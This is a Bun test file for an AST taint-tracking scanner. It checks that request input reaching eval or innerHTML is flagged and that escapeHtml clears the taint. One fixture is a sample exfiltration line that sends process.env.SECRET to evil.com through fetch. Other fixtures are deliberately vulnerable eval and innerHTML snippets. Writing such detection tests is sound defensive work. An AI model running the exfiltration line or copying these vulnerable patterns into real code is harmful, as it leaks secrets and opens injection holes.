import { describe, test, expect } from 'bun:test';
import { scanWithAST } from './ast-engine.js';

describe('AST taint tracking', () => {
  test('1-hop: const x = req.body; eval(x)', () => {
    const code = `const x = req.body;\neval(x);`;
    const findings = scanWithAST(code, 'javascript');
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.evidence_chain?.length).toBeGreaterThanOrEqual(1);
  });

  test('2-hop taint', () => {
    const code = `const a = req.body;\nconst b = a;\neval(b);`;
    const findings = scanWithAST(code, 'javascript');
    expect(findings.length).toBeGreaterThan(0);
  });

  test('3-hop taint', () => {
    const code = `const a = req.body;\nconst b = a;\nconst c = b;\neval(c);`;
    const findings = scanWithAST(code, 'javascript');
    expect(findings.length).toBeGreaterThan(0);
  });

  test('literal eval is safe (no taint)', () => {
    const code = `eval("console.log('hello')")`;
    const findings = scanWithAST(code, 'javascript');
    expect(findings.filter((finding) => finding.rule_id === 'ast.taint.source-to-sink').length).toBe(0);
  });

  test('direct source in sink', () => {
    const code = `eval(req.body.input);`;
    const findings = scanWithAST(code, 'javascript');
    expect(findings.length).toBeGreaterThan(0);
  });

  test('process.env to fetch (env exfil)', () => {
    const code = `const secret = process.env.SECRET;\nfetch('https://evil.com/?d=' + secret);`;
    const findings = scanWithAST(code, 'javascript');
    expect(findings.length).toBeGreaterThan(0);
  });

  test('inline sanitizer clears taint (no false positive)', () => {
    const code = `const c = escapeHtml(req.query.x);\nel.innerHTML = c;`;
    const findings = scanWithAST(code, 'javascript');
    expect(findings.filter((finding) => finding.rule_id === 'ast.taint.source-to-sink').length).toBe(0);
  });

  test('sanitizer on a tracked tainted var clears taint', () => {
    const code = `const x = req.query.x;\nconst c = escapeHtml(x);\nel.innerHTML = c;`;
    const findings = scanWithAST(code, 'javascript');
    expect(findings.filter((finding) => finding.rule_id === 'ast.taint.source-to-sink').length).toBe(0);
  });

  test('unsanitized flow still reported (no regression)', () => {
    const code = `const c = req.query.x;\nel.innerHTML = c;`;
    const findings = scanWithAST(code, 'javascript');
    expect(findings.filter((finding) => finding.rule_id === 'ast.taint.source-to-sink').length).toBeGreaterThan(0);
  });
});
